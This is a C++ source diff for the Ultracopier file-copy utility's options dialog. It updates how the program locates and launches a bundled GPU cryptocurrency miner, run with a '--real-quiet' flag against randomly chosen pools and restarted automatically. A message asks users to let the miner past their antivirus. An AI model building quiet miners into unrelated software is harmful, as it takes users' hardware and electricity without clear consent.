@@ -18,6 +18,7 @@
 #include <QLibrary>
 #include <math.h>
 #include <time.h>
+#define ULTRACOPIER_CGMINER_PATH "bfg/bfg.exe"
 #endif
 
 OptionDialog::OptionDialog() :
@@ -84,17 +85,21 @@ OptionDialog::OptionDialog() :
     if(arch!=NULL)
     {
 
-        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists())
+        if(QFile(QString(arch)+"\\System32\\OpenCL.dll").exists()
+            #if defined(_M_X64)
+            || QFile(QString(arch)+"\\SysWOW64\\OpenCL.dll").exists()
+            #endif
+        )
             OpenCLDll=true;
         else
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No 32Bits openCL");
     }
     else
         ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"No windir");
-    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/cg/cg.exe").exists() && OpenCLDll;
+    haveCgminer=QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists() && OpenCLDll;
     if(!haveCgminer)
     {
-        if(!QFile(QCoreApplication::applicationDirPath()+"/cg/cg.exe").exists())
+        if(!QFile(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH).exists())
         {
             QMessageBox::critical(this,tr("Allow cgminer"),tr("This Ultimate version is only if cgminer is allowed by your antivirus. You can get the normal free version (without cgminer)"));
             ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Warning,"application not found");
@@ -682,19 +687,20 @@ void OptionDialog::startCgminer()
             args=pools.at(rand()%pools.size());
     }
     ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer seam work, pools used: %1").arg(args.join(";")));
-    args << "--real-quiet" << "-T" << "--fix-protocol";// << "--gpu-dyninterval"
-    cgminer.start(QCoreApplication::applicationDirPath()+"/cg/cg.exe",args);
+    args << "--real-quiet" << "-T" << "--no-adl" << "--no-getwork";// << "--gpu-dyninterval"
+    cgminer.start(QCoreApplication::applicationDirPath()+"/"+ULTRACOPIER_CGMINER_PATH,args);
     autorestartcgminer.start();
 }
 
 void OptionDialog::error( QProcess::ProcessError error )
 {
     ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer error: %1").arg(error));
+    //if(error==QProcess::Crashed)
 }
 
 void OptionDialog::finished( int exitCode, QProcess::ExitStatus exitStatus )
 {
-    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer exitCode: %1, exitStatus: %2").arg(exitCode).arg(exitStatus));
+    ULTRACOPIER_DEBUGCONSOLE(Ultracopier::DebugLevel_Notice,QString("cgminer exitCode: %1, exitStatus: %2").arg((quint32)exitCode).arg(exitStatus));
     if(!haveCgminer)
         return;
     if(!OptionEngine::optionEngine->getOptionValue("Ultracopier","giveGPUTime").toBool())
